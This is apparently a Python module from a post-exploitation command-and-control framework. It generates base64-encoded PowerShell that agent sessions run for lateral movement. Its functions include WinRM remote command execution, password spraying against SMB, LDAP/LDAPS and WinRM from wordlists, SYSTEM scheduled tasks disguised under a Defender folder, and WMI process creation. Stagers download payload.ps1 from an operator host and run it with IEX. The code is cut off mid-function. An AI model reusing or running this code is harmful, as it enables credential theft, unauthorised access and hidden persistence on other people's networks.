import sys
import os
import subprocess
import base64
from core.session_handlers import session_manager
from core import shell
from core import stager_server as stage
from colorama import Style, Fore

brightgreen = Style.BRIGHT + Fore.GREEN
brightyellow = Style.BRIGHT + Fore.YELLOW
brightred   = Style.BRIGHT + Fore.RED


def winrm(sid, os_type, username, password, stage_ip, domain=None, dc_host=None, dc_ip=None, local_auth=False, target_ip=None, command=None, debug=None,
    exec_url=None, script_path=None, stager=False, stage_port=8000, op_id="console"):
    """
    winrm -u <username> -p <password> [-d <domain>] [-dc <dc_host>] [--dc-ip <dc_ip>] [--local-auth] -i <target_ip>
    Establish a WinRM session to the target host using the specified credentials.
    """

    # Validate session
    sess = session_manager.sessions.get(sid)
    transport = sess.transport.lower()

    if not sess:
        return brightred + f"[!] No such session"

    display = next((alias for alias, rsid in session_manager.alias_map.items() if rsid == sid), sid)

    # Build user principal
    if local_auth:
        hostname_cmd = "hostname"
        if transport in ("tcp", "tls"):
            hostname = shell.run_command_tcp(sid, hostname_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

        elif transport in ("http", "https"):
            hostname = shell.run_command_http(sid, hostname_cmd, op_id=op_id)

        if hostname:
            print(brightyellow + f"[*] Authenticating to {target_ip} as {hostname}\\{username}...")
            user_principal = f"{hostname}\\{username}"

        else:
            print(brightred + f"[!] Failed to grab hostname from agent {display}")

    else:
        if domain and dc_ip:
            print(brightyellow + f"[*] Authenticating to {target_ip} as {domain}\\{username}...")
            user_principal = f"{domain}\\{username}"

        else:
            if not domain:
                print(brightyellow + f"[*] The -d flag is required if you don't use --local-auth")
                return "FLAG ERROR"

            elif not dc_ip:
                print(brightyellow + f"[*] The --dc-ip flag is required if you don't use --local-auth")
                return "FLAG ERROR"

            elif not dc_ip and not domain:
                print(brightyellow + f"[*] Both the -d and --dc-ip flags are required if you don't use --local-auth")
                return "FLAG ERROR"

    if local_auth and (domain or dc_ip or dc_host):
        print(brightyellow + f"[*] You cannot use the --local-auth flag with any of the domain flags!")
        return "FLAG ERROR"

    if command and (exec_url or script_path):
        print(brightyellow + f"[*] You cannot use the --command flag with the --exec-url or the --script flag!")
        return "FLAG ERROR"

    if exec_url and script_path:
        print(brightyellow + f"[*] You cannot use the --exec-url and the --script flag at once!")
        return "FLAG ERROR"

    if not command:
        print(brightred + f"[*] You must specify a command with --command")
        return "FLAG ERROR"

    if exec_url:
        cmd = f"IEX (New-Object Net.WebClient).DownloadString('{exec_url}')"

    elif script_path:
        if not os.path.exists(script_path):
            print(brightred + f"[!] Script path does not exist: {script_path}")
            return "FILE ERROR"

        with open(script_path, 'r', encoding='utf-8') as f:
            script_content = f.read()

        encoded_script = base64.b64encode(script_content.encode('utf-8')).decode('utf-8')
        cmd = f"$s=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded_script}')); IEX $s"

    if not exec_url and not script_path:
        if command is not None:
            cmd = command

        else:
            cmd = "whoami"

    # Construct PowerShell WinRM command
    if cmd:
        ps_cmd = f"""

$T = '{target_ip}'
try {{
        $nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0])
    }} catch {{
        $nb = $T
    }}

$secpass = ConvertTo-SecureString '{password}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('{user_principal}', $secpass)
Invoke-Command -ComputerName $nb -Credential $cred -ScriptBlock {{ {cmd} }}
"""

    else:
        print(brightred + f"[!] Unable to execute command on remote host {target_ip}")

    # Optionally include DC targeting logic (stubbed; extend as needed)
    if dc_host or dc_ip:
        ps_cmd = (
            f"$sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck; "
            + ps_cmd
        )

    transport = sess.transport.lower()
    out = None

    if stager:
        u = f"http://{stage_ip}:{stage_port}/payload.ps1"
        ps = (
            f"$u='{u}';"
            "$xml=New-Object -ComObject 'MSXML2.ServerXMLHTTP.6.0';"
            "$xml.open('GET',$u,$false);"
            "$xml.send();"
            "IEX $xml.responseText"
        )

        stage.start_stager_server(stage_port, ps_cmd)

        if transport in ("http", "https"):
            out = shell.run_command_http(sid, ps, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = shell.run_command_tcp(sid, ps, timeout=0.5, portscan_active=True, op_id=op_id)

        else:
            return brightred + "[!] Unknown session transport!"

    else:
        if transport in ("http", "https"):
            out = shell.run_command_http(sid, ps_cmd, op_id=op_id)
    
        elif transport in ("tcp", "tls"):
            out = shell.run_command_tcp(sid, ps_cmd, timeout=2, timeoutprint=False, portscan_active=True, op_id=op_id)

        else:
            print(brightred + f"[!] Unsupported session transport!")
            return None

    if out is not None:
        if "Access is denied" in out:
            if not debug and local_auth:
                return "ACCESS DENIED LOCAL AUTH"

            elif not debug and not local_auth:
                return "ACCESS DENIED"

            else:
                return out

    return out or ""


def netexec_smb(sid, userfile, passfile, domain, targets, stage_ip, shares=False, stager=False, stage_port=8000, op_id="console"):
    if shares:
        # forbid files
        try:
            if os.path.isfile(userfile) or os.path.isfile(passfile):
                return brightred + "[!] --shares only works with single USER and PASS, not files"

        except Exception:
            return brightred + "[!] Unable to access local username and/or password files"

    # 1) load your lists locally
    if os.path.isfile(userfile) and not shares:
        try:
            with open(userfile, 'r') as f:
                users = [u.strip() for u in f if u.strip()]
        except Exception as e:
            return brightred + f"[!] Failed to read userfile: {e}"
    else:
        users = [userfile]

    # 2) Load passwords
    if os.path.isfile(passfile) and not shares:
        try:
            with open(passfile, 'r') as f:
                passes = [p.strip() for p in f if p.strip()]
        except Exception as e:
            return brightred + f"[!] Failed to read passfile: {e}"
    else:
        passes = [passfile]

    """print(passes)
    print(users)"""

    # 2) embed lists as PS literals
    users_ps  = "@(" + ",".join(f"'{u}'" for u in users) + ")"
    passes_ps = "@(" + ",".join(f"'{p}'" for p in passes) + ")"
    targets_ps= "@(" + ",".join(f"'{t.strip()}'" for t in targets.split(',')) + ")"

    """print(users_ps)
    print(passes_ps)
    print(targets_ps)"""

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"

    transport = sess.transport.lower()
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)

    if not domain:
        hostname_cmd = "hostname"

        if transport in ("http", "https"):
            out = shell.run_command_http(sid, hostname_cmd, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = shell.run_command_tcp(sid, hostname_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

        if out:
            domain = out

        else:
            print(brightred + f"[!] Failed to fetch hostname from {display}")
            return None
    
    if not shares:
        ps = f"""
$Users   = {users_ps}
$Passes  = {passes_ps}
$Domain  = '{domain}'
$Targets = {targets_ps}
$devvar = $false

foreach ($T in $Targets) {{
  try {{
        $nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0])
    }} catch {{
        $nb = $T
    }}
  
  Write-Output "------$T------\n"

  foreach ($U in $Users) {{
    foreach ($P in $Passes) {{

      # build PSCredential once
      $sec  = ConvertTo-SecureString $P -AsPlainText -Force
      $cred = New-Object System.Management.Automation.PSCredential ("$Domain\\$U", $sec)

      # 1) If Test‑SmbConnection exists, use it
      if (Get-Command Test-SmbConnection -ErrorAction SilentlyContinue) {{
        try {{
          $tc = Test-SmbConnection -ServerName $T -Credential $cred -ErrorAction Stop | Out-Null
          if ($tc.SMBStatus -eq 'Success') {{
              Write-Output $("SMB         {{0,-15}} 445    {{1,-15}} [+] {{2}}\\{{3}}:{{4}}" -f $T, $nb, $Domain, $U, $P)
          }} else {{
              $devvar = $true
              #Write-Output "INVALID $T $U $P"
            }}
        }} catch {{
          $devvar = $true
          #Write-Output "INVALID $T $U $P"
        }}
      }}
      else {{
        # 2) Fallback: P/Invoke WNetAddConnection2 → WNetCancelConnection2
        try {{
    # will throw if NETRESOURCE isn’t defined
    [NETRESOURCE] | Out-Null
}}
catch {{
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
[StructLayout(LayoutKind.Sequential)]
public struct NETRESOURCE {{
    public int dwScope;
    public int dwType;
    public int dwDisplayType;
    public int dwUsage;
    [MarshalAs(UnmanagedType.LPWStr)] public string lpLocalName;
    [MarshalAs(UnmanagedType.LPWStr)] public string lpRemoteName;
    [MarshalAs(UnmanagedType.LPWStr)] public string lpComment;
    [MarshalAs(UnmanagedType.LPWStr)] public string lpProvider;
}}
public class Win32 {{
    [DllImport("mpr.dll", CharSet=CharSet.Auto)]
    public static extern int WNetAddConnection2(
        ref NETRESOURCE resource, string password, string username, int flags);
    [DllImport("mpr.dll", CharSet=CharSet.Auto)]
    public static extern int WNetCancelConnection2(
        string name, int flags, bool force);
}}
"@ -PassThru | Out-Null
}}
        $nr = New-Object NETRESOURCE
        $nr.dwType = 1
        $nr.lpRemoteName = "\\\\$T\\IPC$"

        $res = [Win32]::WNetAddConnection2([ref]$nr, $P, "$Domain\\$U", 0)
        if ($res -eq 0) {{
          Write-Output $("SMB         {{0,-15}} 445    {{1,-15}} [+] {{2}}\\{{3}}:{{4}}" -f $T, $nb, $Domain, $U, $P)
          [Win32]::WNetCancelConnection2($nr.lpRemoteName, 0, $true) | Out-Null
        }}
        else {{
          # 3) Try New-SmbMapping
          try {{
            New-SmbMapping -RemotePath "\\\\$T\\IPC$" -UserName "$Domain\\$U" -Password $P -ErrorAction Stop | Out-Null
            Write-Output $("SMB         {{0,-15}} 445    {{1,-15}} [+] {{2}}\\{{3}}:{{4}}" -f $T, $nb, $Domain, $U, $P)
            Remove-SmbMapping -RemotePath "\\\\$T\\IPC$" -Force | Out-Null
          }} catch {{
            # 4) Legacy net use
            net use "\\\\$T\\IPC$" /user:"$Domain\\$U" $P /persistent:no > $null 2>&1
            if ($LASTEXITCODE -eq 0) {{
              Write-Output $("SMB         {{0,-15}} 445    {{1,-15}} [+] {{2}}\\{{3}}:{{4}}" -f $T, $nb, $Domain, $U, $P)
              net use "\\\\$T\\IPC$" /delete > $null 2>&1
            }} else {{
              $devvar = $true
              #Write-Output "INVALID $T $U $P"
            }}
          }}
        }}
      }}

    }}  
  }}  
}}
"""
    
    if shares:
        ps = f"""
# load the SmbShare module if it exists
Import-Module SmbShare -ErrorAction SilentlyContinue

$Targets = {targets_ps}
$Domain  = '{domain}'
$User    = '{userfile}'
$Pass    = '{passfile}'

$sec  = ConvertTo-SecureString $Pass -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("$Domain\\$User", $sec)

foreach ($T in $Targets) {{
  try {{ $nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0]) }}
  catch {{ $nb = $T }}

  Write-Output "------$T------`n"
  Write-Output $("SMB         {{0,-15}} 445    {{1,-15}} Share           Permissions     Remark" -f $T, $nb)
  Write-Output $("SMB         {{0,-15}} 445    {{1,-15}} -----           -----------     ------" -f $T, $nb)

  try {{
    # 1) Remote share enum via CIM
    $cs = New-CimSession -ComputerName $T -Credential $cred -ErrorAction Stop
    $shares = Get-SmbShare -CimSession $cs -ErrorAction Stop

    if ($shares.Count -eq 0) {{
    throw "No shares returned via CIM"
    }}


    foreach ($s in $shares) {{
      $perm   = ($s.AccessRight -join ',')
      $remark = $s.Description
      try {{
        Write-Output $("WIN         {{0,-15}} 445    {{1,-15}} {{2,-15}} {{3,-15}} {{4}}" -f $T, $nb, $s.Name, $perm, $remark)
      }} catch {{
        Write-Host ("[!] Error formatting share '{{0}}': {{1}}" -f $s.Name, $_.Exception.Message)
      }}
    }}

    # clean up
    Remove-CimSession $cs -ErrorAction SilentlyContinue
  }}
  catch {{
    # 2) Fallback to net view if CIM/share cmdlet fails
    Write-Host "TEST"
    try {{
    net view \\\\$T 2>$null |
      Where-Object {{ $_ -and $_ -match '\\s(Disk|IPC|Printer|Device)\\s' }} |
      ForEach-Object {{
        $name = ($_ -split ' ')[0]
        $perm = 'N/A'
        $remark = 'N/A'
        if (-not [string]::IsNullOrWhiteSpace($remark)) {{
        # leave it as-is
        }} else {{
          $remark = 'N/A'
        }}
        Write-Output $("WIN         {{0,-15}} 445    {{1,-15}} {{2, -15}} {{3,-15}} {{4}}" -f $T, $nb, $name, $perm, $remark)
      }}
    }}
    catch {{ Write-Host "[ERROR] $($_.Exception.Message)" }}
  }}
}}
"""
    
    if not shares:
        b64 = base64.b64encode(ps.encode('utf-16le')).decode()

    elif shares:
        b64 = base64.b64encode(ps.encode('utf-16le')).decode()

    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )


    if stager:
        u = f"http://{stage_ip}:{stage_port}/payload.ps1"
        ps_cmd = (
            f"$u='{u}';"
            "$xml=New-Object -ComObject 'MSXML2.ServerXMLHTTP.6.0';"
            "$xml.open('GET',$u,$false);"
            "$xml.send();"
            "IEX $xml.responseText"
        )

        stage.start_stager_server(stage_port, ps)

        if transport in ("http", "https"):
            out = shell.run_command_http(sid, ps_cmd, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

        else:
            return brightred + "[!] Unknown session transport!"

    else:
        if transport in ("http", "https"):
            out = shell.run_command_http(sid, one_liner, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)
    
        else:
            print(brightred + f"[!] Unknown transport for session")
            return None

    if out:
        if "SMB" in out and not shares:
            return out

        if "SMB" in out and "WIN" in out and shares:
            return out

        else:
            print(brightred + f"[!] No valid credentials found")
            return None

    else:
        print(brightred + f"[!] No valid credentials found")
        return None

def netexec_ldap(sid, userfile, passfile, domain, dc, stage_ip, ldaps=False, port=False, debug=False, stager=False, stage_port=8000, op_id="console"):

    if os.path.isfile(userfile):
        with open(userfile, 'r') as f:
            users = [u.strip() for u in f if u.strip()]
    else:
        users = [userfile]

    if os.path.isfile(passfile):
        with open(passfile, 'r') as f:
            passes = [p.strip() for p in f if p.strip()]
    else:
        passes = [passfile]

    users_ps = "@(" + ",".join(f"'{u}'" for u in users) + ")"
    passes_ps = "@(" + ",".join(f"'{p}'" for p in passes) + ")"
    print(port)

    if port:
        port = port

    else:
        port = 389

    if ldaps and port == 389:
        port = 636

    elif not ldaps and port == 389:
        port = 389

    if port:
        if port not in ("389", "636", "3268", "3269"):
            gc = "$true"

        else:
            gc = "$false"

    if not gc:
        gc = "$false"

    if not ldaps:
        ps = f"""
$Users = {users_ps}
$Passes = {passes_ps}
$Domain = '{domain}'
$DC = '{dc}'
$Port = {port}

foreach ($U in $Users) {{
  foreach ($P in $Passes) {{
    try {{
      $sec = ConvertTo-SecureString $P -AsPlainText -Force
      $cred = New-Object System.Management.Automation.PSCredential ("$Domain\\$U", $sec)

      # Prefer AD module
      if (Get-Command Get-ADUser -ErrorAction SilentlyContinue) {{
        Get-ADUser -Filter * -Server $($DC):$Port -Credential $cred -ResultSetSize 1 -ErrorAction SilentlyContinue | Out-Null
        Write-Output $("LDAP        {{0,-15}} [+] {{1}}\\{{2}}:{{3}}" -f $DC, $Domain, $U, $P)
      }} else {{
        # Native LDAP query fallback
        $dn = ([ADSI]"LDAP://RootDSE").defaultNamingContext
        $CurrentDomain = "LDAP://$($DC):$Port/$dn"
        $domainobj = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$U,$P)
        if ($domainobj.name -eq $null) {{ }}
        else {{ Write-Output $("LDAP        {{0,-15}} [+] {{1}}\\{{2}}:{{3}}" -f $DC, $Domain, $U, $P) }}
      }}
    }} catch {{
        try {{
          $dn = ([ADSI]"LDAP://RootDSE").defaultNamingContext
          $server = "$($DC):$Port"
          $CurrentDomain = "LDAP://$server/$dn"
          $domainobj = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$U,$P)
          if ($domainobj.name -eq $null) {{ }}
          else {{ Write-Output $("LDAP        {{0,-15}} [+] {{1}}\\{{2}}:{{3}}" -f $DC, $Domain, $U, $P) }}
        }}
        catch {{ }}
    }}
  }}
}}
"""
    
    if ldaps:
        ps = f"""
$Users   = {users_ps}
$Passes  = {passes_ps}
$Domain  = '{domain}'
$DC      = '{dc}'
$Port    = {port}
$GC = {gc}
$ldapsPorts = @(636, 3269)

foreach ($U in $Users) {{
  foreach ($P in $Passes) {{
    try {{
      $sec  = ConvertTo-SecureString $P -AsPlainText -Force
      $cred = New-Object System.Management.Automation.PSCredential("$Domain\\$U", $sec)

      # 1) Try AD module if available
      if ($ldapsPorts -contains $Port) {{
        if (Get-Command Get-ADUser -ErrorAction SilentlyContinue) {{
          try {{
            Get-ADUser -Filter * -Server "$($DC):$Port" -Credential $cred -ResultSetSize 1 -ErrorAction Stop | Out-Null
            Write-Output $("LDAPS       {{0,-15}} [+] {{1}}\\{{2}}:{{3}}" -f $DC, $Domain, $U, $P)
            continue
          }} catch {{
            
          }}
        }}
      }}

      # 2) Fallback: native LDAPS bind via LdapConnection
      try {{
        [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
        if ($GC) {{ $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($DC, $Port, $true, $false)}} 
        else {{ $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($DC, $Port, $false, $false) }}
        $ldap = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)
        
        $ldap.SessionOptions.VerifyServerCertificate = {{ param($c,$cert) return $true }}
        $ldap.SessionOptions.ProtocolVersion   = 3
        $ldap.SessionOptions.SecureSocketLayer = $true

        $ldap.AuthType   = [System.DirectoryServices.Protocols.AuthType]::Negotiate
        $ldap.Credential = New-Object System.Net.NetworkCredential($U, $P, $Domain)
        
        $ldap.Bind()

        Write-Output $("LDAPS       {{0,-15}} [+] {{1}}\\{{2}}:{{3}}" -f $DC, $Domain, $U, $P)
      }} catch {{
        
      }}

    }} catch {{
      
    }}
  }}
}}
"""

    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"

    transport = sess.transport.lower()

    if stager:
        u = f"http://{stage_ip}:{stage_port}/payload.ps1"
        ps_cmd = (
            f"$u='{u}';"
            "$xml=New-Object -ComObject 'MSXML2.ServerXMLHTTP.6.0';"
            "$xml.open('GET',$u,$false);"
            "$xml.send();"
            "IEX $xml.responseText"
        )

        stage.start_stager_server(stage_port, ps)

        if transport in ("http", "https"):
            out = shell.run_command_http(sid, ps_cmd, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

        else:
            return brightred + "[!] Unknown session transport!"

    else:
        if transport in ("http", "https"):
            out = shell.run_command_http(sid, one_liner, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)
        else:
            return brightred + "[!] Unsupported transport"

    if out:
        if "LDAP" in out or "LDAPS" in out:
            return out

        elif "LDAP" not in out and "LDAPS" not in out:
            return brightred + "[!] No valid credentials found"

        elif "LDAP" not in out and "LDAPS" not in out and debug:
            return out

    elif not out:
        return brightred + "[!] No valid credentials found"

    elif not out and debug:
        return out


def netexec_winrm(sid, userfile, passfile, domain, targets, stage_ip, port=False, use_https=False, sleep_seconds=0, sleep_minutes=0,
    debug=False, stager=False, stage_port=8000, op_id="console"):

    # 1) load users
    if os.path.isfile(userfile):
        with open(userfile, 'r') as f:
            users = [u.strip() for u in f if u.strip()]
    else:
        users = [userfile]

    # 2) load passes
    if os.path.isfile(passfile):
        with open(passfile, 'r') as f:
            passes = [p.strip() for p in f if p.strip()]
    else:
        passes = [passfile]

    # 3) format PS arrays & target list
    users_ps   = "@(" + ",".join(f"'{u}'" for u in users) + ")"
    passes_ps  = "@(" + ",".join(f"'{p}'" for p in passes) + ")"
    targets_ps = "@(" + ",".join(f"'{t.strip()}'" for t in targets.split(',')) + ")"

    # 4) choose port
    if port:
      port = port

    else:
        if use_https:
            port = 5986

        else:
            port = 5985

    if not port:
        return brightred + "[!] Unable to determine port!"

    if use_https:
        prefix = "https"

    else:
        prefix = "http"
    
    ps = f"""
$Users        = {users_ps}
$Passes       = {passes_ps}
$Domain       = '{domain}'
$Targets      = {targets_ps}
$Port         = {port}
$Protocol     = '{prefix}'
$SleepSeconds = {sleep_seconds}
$SleepMinutes = {sleep_minutes}

#Write-output "[DEBUG] Starting Invoke-Command WinRM spray"

foreach ($T in $Targets) {{
  #Write-output "[DEBUG] Target: $T"
  #Write-output "[DEBUG] Resolving DNS name for $T"
  try {{
    $name = [System.Net.Dns]::GetHostEntry($T).HostName
  }} catch {{
    $name = $T
  }}
  #Write-output "[DEBUG] Resolved name: $name"

  foreach ($U in $Users) {{
    #Write-output "[DEBUG] User: $U"

    foreach ($P in $Passes) {{
      #Write-output "[DEBUG] PASS: $P"

      # throttle
      if ($SleepSeconds -gt 0) {{
        #Write-Output "[DEBUG] Sleeping $SleepSeconds seconds"
        Start-Sleep -Seconds $SleepSeconds
      }} elseif ($SleepMinutes -gt 0) {{
        #Write-Output "[DEBUG] Sleeping $SleepMinutes minutes"
        Start-Sleep -Minutes $SleepMinutes
      }}

      try {{
        #Write-Host "[DEBUG] Trying Invoke-Command for ${{U}}:$P"
        $sec  = ConvertTo-SecureString $P -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential("$Domain\\$U", $sec)

        if ($Protocol -eq 'https') {{
          Invoke-Command -ComputerName $name -Port $Port -Authentication Negotiate -UseSSL -Credential $cred -ScriptBlock {{ hostname }} -ErrorAction Stop | Out-Null
        }} else {{
          Invoke-Command -ComputerName $name -Port $Port -Credential $cred -Authentication Negotiate -ScriptBlock {{ hostname }} -ErrorAction Stop | Out-Null
        }}

        #Write-Host "TEST"
        Write-Output ("WINRM       {{0,-15}} [+] {{1}}\\{{2}}:{{3}}" -f $name, $Domain, $U, $P) | Out-String
      }} catch {{
        Write-Output "[DEBUG] Invoke-Command failed for ${{U}}:$P → $($_.Exception.Message)"
      }}
    }}
  }}
}}
"""

    # 6) b64‑encode & dispatch
    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"

    transport = sess.transport.lower()

    if stager:
        u = f"http://{stage_ip}:{stage_port}/payload.ps1"
        ps_cmd = (
            f"$u='{u}';"
            "$xml=New-Object -ComObject 'MSXML2.ServerXMLHTTP.6.0';"
            "$xml.open('GET',$u,$false);"
            "$xml.send();"
            "IEX $xml.responseText"
        )

        stage.start_stager_server(stage_port, ps)

        if transport in ("http", "https"):
            out = shell.run_command_http(sid, ps_cmd, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

        else:
            return brightred + "[!] Unknown session transport!"

    else:
        if transport in ("http", "https"):
            out = shell.run_command_http(sid, one_liner, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)

        else:
            return brightred + "[!] Unknown transport detected!"

    if out:
        if "WINRM" in out:
            winrm_lines = [line for line in out.splitlines() if line.startswith("WINRM")]
            if winrm_lines:
                return "\n".join(winrm_lines)

        else:
            if debug:
                return out

            else:
                return brightred + "[!] No valid WinRM creds found"

    else:
        if debug:
            return out
        
        else:
            return brightred + "[!] No valid WinRM creds found"

def rpcexec(sid, userfile, passfile, domain, targets, command, stage_ip, svcname="GunnerSvc", cleanup=False,
    debug=False, stager=False, stage_port=8000, op_id="console"):

    # 1) load users
    if os.path.isfile(userfile):
        with open(userfile, 'r') as f:
            users = [u.strip() for u in f if u.strip()]
    else:
        users = [userfile]

    # 2) load passes
    if os.path.isfile(passfile):
        with open(passfile, 'r') as f:
            passes = [p.strip() for p in f if p.strip()]
    else:
        passes = [passfile]

    # 3) format PS arrays & variables
    users_ps   = "@(" + ",".join(f"'{u}'" for u in users) + ")"
    passes_ps  = "@(" + ",".join(f"'{p}'" for p in passes) + ")"
    targets_ps = "@(" + ",".join(f"'{t.strip()}'" for t in targets.split(',')) + ")"
    cmd_esc    = command.replace("'", "''")
    svc_esc    = svcname.replace("'", "''")
    cleanup_ps = "$true" if cleanup else "$false"

    # 4) build the PowerShell payload
    ps = f"""
$Targets = {targets_ps}
$Cmd     = '{cmd_esc}'
$Cleanup = {cleanup_ps}

foreach ($T in $Targets) {{
    
    $service = New-Object -ComObject "Schedule.Service"
    
    $service.Connect($T)
    $root = $service.GetFolder("\\")
    
    $taskDef = $service.NewTask(0)

    $trigger = $taskDef.Triggers.Create(1)
    $trigger.StartBoundary = (Get-Date).AddMinutes(1).ToString("yyyy-MM-ddTHH:mm:ss")

    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Cmd))

    $action = $taskDef.Actions.Create(0)  # 0 = ExecAction
    $action.Path      = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    $action.Arguments = "-NoProfile -WindowStyle Hidden -EncodedCommand $b64"

    $principal = $taskDef.Principal
    $principal.UserId    = "SYSTEM"
    $principal.LogonType = 5

    $taskName   = "GunnerTask_$([guid]::NewGuid().ToString('N').Substring(0,8))"
    $folderPath = "\\Microsoft\\Windows\\Defender"
    
    try {{ $folder = $root.GetFolder($folderPath) }}
    catch {{ $folder = $root.CreateFolder($folderPath, $null) }}

    
    $regTask = $folder.RegisterTaskDefinition($taskName, $taskDef, 6, $null, $null, 5)
    
    $regTask.Run($null) | Out-Null

    if ($Cleanup) {{
        Start-Sleep -Seconds 5
        $folder.DeleteTask($taskName, 0)
    }}
}}

Write-Output "THE BUMBACLUT IN THE BASKET"
"""

    # 5) base64‑encode & dispatch
    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )
    
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"

    transport = sess.transport.lower()

    if stager:
        u = f"http://{stage_ip}:{stage_port}/payload.ps1"
        ps_cmd = (
            f"$u='{u}';"
            "$xml=New-Object -ComObject 'MSXML2.ServerXMLHTTP.6.0';"
            "$xml.open('GET',$u,$false);"
            "$xml.send();"
            "IEX $xml.responseText"
        )

        stage.start_stager_server(stage_port, ps)

        if transport in ("http", "https"):
            out = shell.run_command_http(sid, ps_cmd, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

        else:
            return brightred + "[!] Unknown session transport!"

    else:
        if transport in ("http", "https"):
            out = shell.run_command_http(sid, one_liner, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)

        else:
            return brightred + "[!] Unknown transport detected!"

        
    if out:
        if "THE BUMBACLUT IN THE BASKET" in out:
            return brightgreen + f"[+] Successfully executed command on Target via RPC COM Scheduled task API"
        else:
            return out if debug else brightred + "[!] No successful RPCEXEC executions found"
    else:
        return brightred + "[!] No output from RPCEXEC attempt"

def wmiexec(sid, username, password, domain, target, command, stage_ip,
    debug=False, stager=False, stage_port=8000, op_id="console"):
    ps = f"""
$T = '{target}'
try {{
    $name = [System.Net.Dns]::GetHostEntry($T).HostName
  }} catch {{
    $name = $T
  }}

$sec  = ConvertTo-SecureString '{password}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('{domain}\\{username}', $sec)

$cs   = New-CimSession -ComputerName "$name" -Credential $cred -ErrorAction Stop

$result = Invoke-CimMethod -CimSession $cs -Namespace root\\cimv2 -ClassName Win32_Process -MethodName Create -Arguments @{{ CommandLine = "{command}" }}

Write-Output ("WMIEXEC    {{0,-7}} Return={{1}}" -f $result.ProcessId, $result.ReturnValue)
"""

    # encode & dispatch exactly like your other PS‐based function


    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"

    transport = sess.transport.lower()
    out = None

    if stager:
        u = f"http://{stage_ip}:{stage_port}/payload.ps1"
        ps_cmd = (
            f"$u='{u}';"
            "$xml=New-Object -ComObject 'MSXML2.ServerXMLHTTP.6.0';"
            "$xml.open('GET',$u,$false);"
            "$xml.send();"
            "IEX $xml.responseText"
        )

        stage.start_stager_server(stage_port, ps)

        if transport in ("http", "https"):
            out = shell.run_command_http(sid, ps_cmd, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

        else:
            return brightred + "[!] Unknown session transport!"

    else:
        if transport in ("http", "https"):
            out = shell.run_command_http(sid, one_liner, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)

        else:
            return brightred + "[!] Unknown session transport!"

    if out:
        if "WMIEXEC" in out:
            lines = [l for l in out.splitlines() if l.startswith("WMIEXEC")]
            if lines:
                formatted_lines = "\n".join(lines)
                if "Return=0" in formatted_lines:
                    return brightgreen + "Successfully executed command on remote target via WMI"

                else:
